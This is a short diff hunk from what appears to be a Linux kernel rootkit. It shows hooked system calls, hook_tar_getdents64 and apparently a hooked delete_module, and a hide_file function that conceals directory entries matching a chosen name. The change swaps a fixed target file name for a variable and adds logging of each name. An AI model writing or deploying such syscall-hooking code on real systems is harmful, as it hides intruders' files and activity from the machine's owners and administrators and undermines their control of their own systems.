@@ -88,9 +88,9 @@ asmlinkage long hook_tar_delete_mod(const struct pt_regs *pt){
   return (*my_pre_sys_delete_mod)(pt);
 }
 int cnt=0;
-char name[10005]="file.c";
 inline static bool hide_file(char *file_name){
-  return strcmp(name,file_name)==0;
+  printk("%s",file_name);
+  return strcmp(file_name,message)==0;
 }
 asmlinkage long hook_tar_getdents64(const struct pt_regs *pt){
   int ret=(*my_pre_sys_getdents64)(pt);
